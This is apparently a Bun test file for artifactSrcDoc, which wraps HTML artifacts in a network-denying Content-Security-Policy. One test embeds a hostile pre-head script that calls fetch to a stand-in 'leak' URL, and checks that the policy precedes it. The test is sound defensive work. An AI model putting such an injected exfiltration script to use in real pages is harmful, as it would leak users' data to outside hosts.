import { describe, expect, test } from "bun:test";
import { artifactSrcDoc } from "@/src/lib/artifact-srcdoc.ts";

describe("artifactSrcDoc", () => {
	test("places the network-denying policy before hostile pre-head scripts", () => {
		const marker = "HOSTILE_PRE_HEAD_SCRIPT";
		const doc = artifactSrcDoc(
			"html",
			`<!doctype html><script>${marker};fetch("https://example.com/leak")</script><html><head><title>x</title></head><body>ok</body></html>`
		);

		expect(doc).not.toBeNull();
		expect(doc?.indexOf("Content-Security-Policy")).toBeGreaterThanOrEqual(0);
		expect(doc?.indexOf("connect-src 'none'")).toBeGreaterThanOrEqual(0);
		expect(doc?.indexOf("Content-Security-Policy")).toBeLessThan(
			doc?.indexOf(marker) ?? -1
		);
	});

	test("wraps fragments with the same policy", () => {
		const doc = artifactSrcDoc("html", "<main>safe fragment</main>");
		expect(doc).toContain("Content-Security-Policy");
		expect(doc).toContain("<main>safe fragment</main>");
	});
});
